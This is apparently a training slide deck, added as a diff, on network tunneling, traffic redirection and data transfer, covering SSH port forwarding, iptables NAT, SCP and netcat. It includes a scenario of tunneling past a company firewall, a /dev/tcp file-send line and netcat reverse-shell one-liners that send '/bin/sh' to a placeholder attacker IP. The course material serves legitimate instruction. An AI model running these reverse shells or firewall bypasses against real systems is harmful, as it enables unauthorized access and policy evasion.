@@ -1,0 +1,418 @@
+= Movement and Data Transfer
+CCTC-NETWORKING
+//.images
+:slides: true
+:imagesdir: https://git.cybbh.space/electric-boogaloo/public/raw/master/modules/networking/slides/images
+:source-highlighter: highlightjs
+:icons: font
+:title-slide-background-image: slide_title_blk.png
+:revealjs_theme: black
+:revealjs_transition: convex
+:revealjs_backgroundTransition: none
+
+== Skills and Objectives
+
+* SKILL CCNE015: Network Tunneling
+
+* SKILL CCNE016: Traffic Redirection
+
+* SKILL CCNE017: Data Transfer
+
+image::slide_title_fade.png[background, size=100%]
+
+== CCNE015: Network Tunneling
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Getting around the firewall
+
+Imagine that you are at work, but you wanted to do non-work related activities. Your company prevents you from accessing a website you want to browse to(gambling.com).  SSH is allowed from the inside of network outbound because the IT staff must do remote administration of devices at branch offices.
+[.stretch]
+image::peskyFW.png[]
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Understanding SSH (Secure Shell) tunneling
+
+* Commonly used application for remote login into systems via encrypted sessions
+
+* Secures many types of traffic
+
+* Works in a client-server architecture
+
+Tunneling can be performed with SSH by connecting ports/services between SSH endpoints.
+
+----
+
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Purpose of multi-hop tunneling
+
+SSH Tunnels can be used to conceal movement through a network or on the way to a target hot.
+
+----
+
+host1===SSH===host2
+
+--then--
+
+host2===SSH===host3
+
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Basic Port Forwarding
+
+Port Forwarding allows you to connect to another host over a tunnel and use a specific port to access given information
+
+Types:
+
+* Local
+
+* Remote
+
+* Dynamic
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Local port forwarding
+
+[.stretch]
+image::Local_port_forwarding.png[]
+
+ssh -L 9001:209.0.0.1:80 home@190.10.0.1 -NT
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Remote port forwarding
+
+[.stretch]
+image::Remote_port_forwarding.png[]
+
+ssh -R 9001:10.0.0.57:80 home@190.10.0.1 -NT
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Dynamic port forwarding
+
+Dynamic port forwarding over an ssh tunnel needs a "wrapper" to specify the endpoint. Thiscan be a proxy settings in your browser, or a program like Proxychains. *By default, Proxychains uses port 9050.  Can be changed in the .conf file.
+[.stretch]
+image::dynamic.png[]
+image::slide_title_fade.png[background, size=100%]
+
+=== proxychains
+
+Run TCP/IP based application on your host machine through proxychains. The ssh forwarding allows you to access many dynamic target ports.
+
+[.stretch]
+image::proxychains.png[]
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Tunnel within a tunnel
+Your security team blocked all ssh traffic destined to our Home ssh server.  They can't block all ssh traffic due to operational requirements. You can use a different server. However, you don't control this server so your account won't allow ou to open a terminal session. You need to ssh to your Home server to SCP somefiles you need.
+[.stretch]
+image::tunnel-in-tunnel.png[]
+
+image::slide_title_fade.png[background, size=100%]
+
+
+
+== CCNE016:traffic redirection
+
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Use cases for traffic redirection
+* Network path isolation
+** Tunnels
+** Firewalls
+** Load balancers
+** Routers, switchers (e.g.QOS, link costs)
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Traffic redirection using tools
+
+One of the main traffic redirecting tools used by the DOD is the Citrx Netscaler. Netscalers identifies network domains and controls the traffic across the domains. It has two main components.
+
+Main components:
+
+* listen policies
+* Shadow virtual servers
+
+image::slide_title_fade.png[background, size=100%]
+
+=== listen policies parameters
+
+[.stretch]
+image::listen_policies.png[]
+
+
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Redirect network traffic utilizing iptables NAT table
+
+While doing a server migration, it happens that some traffic still routes to theold machine because the DNS servers are not yet synced or some people are using the IP address instead of the  domain name. By using iptables and its masqueradefeature, it is posible to forward all traffic from the old server to the new IP.It is assumed that you do not have iptables running, or at least no NAT table rules for chain prerouting and postrouting.
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Redirect network traffic utilizing iptables (con't)
+
+For NAT to work, you have to allow forwarding on your server
+
+----
+$echo 1 > /proc/sys/net/ipv4/ip_forward
+----
+
+
+To allow LAN nodes with private IP addresses to communicate with external public networks, configure the firewall for IP masquerading, which masks request from LAN nodes with the IP address of the firewall's external device (in this case, eth0)
+
+----
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Source NAT
+
+[.stretch]
+image::Source_NAT_image.png[]
+
+-Change the source address to [RED]#1.1.1.1#
+
+----
+iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to 1.1.1.1
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Source NAT (IP & PORT)
+
+[.stretch]
+image::Source_NAT_w_port.png[]
+
+-Change the source address to [RED]#1.1.1.1# and the port to [RED]#9001#
+
+----
+iptables -t nat -A POSTROUTING -p tcp -o eth0 -j SNAT --to 1.1.1.1:9001
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Destination NAT (IP)
+
+[.stretch]
+image::Dest_NAT_image.png[]
+
+-Change the destination address to [RED]#10.0.0.1#
+
+----
+iptables -t nat -A PREROUTING -i eth0 -j DNAT --to 10.0.0.1
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Destination NAT(Port Forwarding)
+
+[.stretch]
+image::Dest_NAT_w_port.png[]
+
+-Forward traffic to an internal or private IP on port [RED]#8080#
+
+----
+iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT --to 10.0.0.1:8080
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+== CCNE017:DATA TRANSFER
+
+
+
+image::slide_title_fade.png[background, size=100%]
+
+
+
+=== Common methods of transferring data
+
+* FTP
+* SCP
+* Email
+* Physical Media
+* Download
+* Cloud
+
+image::slide_title_fade.png[background, size=100%]
+
+=== SCP (Secure copy) to a remote client
+
+[.strech]
+image::SCPto.png[]
+
+Copying a file from local client to a remote client
+
+----
+scp file1.txt username@10.0.0.2:/remote-directory/path
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== SCP (Secure copy) from a remote client
+
+[.stretch]
+image::SCPfrom.png[]
+Copying a file form remote client to a local client
+
+----
+scp username@10.0.0.2:file2.txt /local-directory/path
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== NETCAT
+
+NETCAT is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.  It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
+
+* inbound and outbound connections, TCP/UDP, to or from any ports
+* Allows special tunneling
+* Port scanning
+* Advanced usage options such as hexdumps
+
+
+
+image::slide_title_fade.png[background, size=100%]
+
+=== NETCAT: Client to listener file transfer
+
+[.stretch]
+image::NC_Client.png[]
+
+Client (sends file): nc 10.0.0.2 9001 < file.txt
+Listener (receive file): nc -l -p 9001 > newfile.txt
+
+
+image::slide_title_fade.png[background, size=100%]
+
+=== NETCAT: Listener to Client file transfer
+
+[.stretch]
+image::NC_Listen.png[]
+
+Listener (sends file): nc -l -p 9001 < file.txt
+Client (receive file): nc 10.0.0.2 9001 > newfile.txt
+
+
+image::slide_title_fade.png[background, size=100%]
+
+=== NETCAT Relays
+
+On Client Relay:
+
+----
+mknod mypipe p
+nc 10.0.0.3 9002 0< mypipe | nc 10.0.0.1 9001 1> mypipe
+----
+
+On Listener2 (sends info):
+
+----
+nc -l -p 9002 < infile.txt
+----
+
+On Listener1 (receives info):
+
+----
+nc -l -p 9001 > outfile.txt
+----
+
+Writes the output to listener1 and listener2 through the named pipe
+
+image::slide_title_fade.png[background, size=100%]
+
+=== File Transfer with /dev/tcp
+
+On the receiving box:
+
+----
+nc -l -p 1111 >file.txt
+----
+
+On the sending box:
+
+----
+cat file.txt > /dev/tcp/10.2.0.2/111
+----
+
+This method is useful for host that does not have NETCAT available.
+
+image::slide_title_fade.png[background, size=100%]
+
+
+=== Reverse shell using NETCAT
+
+When shelled into the remote host:
+
+----
+nc -c /bin/sh <your ip> <any unfiltered port>
+----
+
+You could even pipe BASH through NETCAT.
+
+----
+/bin/sh | nc <your ip> <any unfiltered port>
+----
+
+Then listen for the shell.
+
+----
+nc -l -p <same unfiltered port> -vvv
+----
+
+image::slide_title_fade.png[background, size=100%]
+
+=== Covert Channel
+
+A Covert Channel is a method of creating a capability to transfer information (Data exfiltration) objects between endpoints that should not be allowed based on policy.
+
+Strategies attackers use to avoid detection:
+
+* VoIP
+* Tunnels
+** ICMP
+** DNS
+** HTTP
+
+All can be used to transport encrypted data out of a network.
+
+image::slide_title_fade.png[background, size=100%]
+
+=== BOTNETS
+
+A network of computers affected with malware that allow a master to control and utilize Zombies.
+
+Used for:
+
+* Spam
+* DDOS
+* Spyware
+* Viruses
+* Clickfraud
+
+Common Protocols (used for command and control):
+
+* HTTP, UDP, DNS
+
+image::slide_title_fade.png[background, size=100%]
